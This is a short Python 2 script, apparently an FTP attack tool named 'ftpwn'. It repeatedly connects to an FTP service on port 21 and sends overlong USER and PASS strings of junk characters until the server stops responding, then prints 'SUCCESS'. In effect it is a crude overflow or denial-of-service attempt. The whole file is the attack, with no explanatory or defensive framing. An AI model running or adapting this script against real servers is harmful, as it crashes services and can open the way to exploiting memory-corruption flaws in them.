import socket

def ftpwn(number):   
	mysock = socket.socket(socket.AF_INET , socket.SOCK_STREAM)

	mysock.connect(("localhost", 21))

	print mysock.recv(10000)

	username = "A!@#$%^&*(&^%$#AAAAAAAAAAAAAAAAA" *number
	mysock.send("USER" + username + "\r\n")
	print mysock.recv(10000)

	password = "A!@#$%^&*(&^%$#A" *91

	mysock.send("PASS" + password + "\r\n")

	print mysock.recv(10000)

	mysock.close()
print ("POWNERs")



while(True):
    try:
        ftpwn(90)
    except:
        print ("SUCCESS")
        break
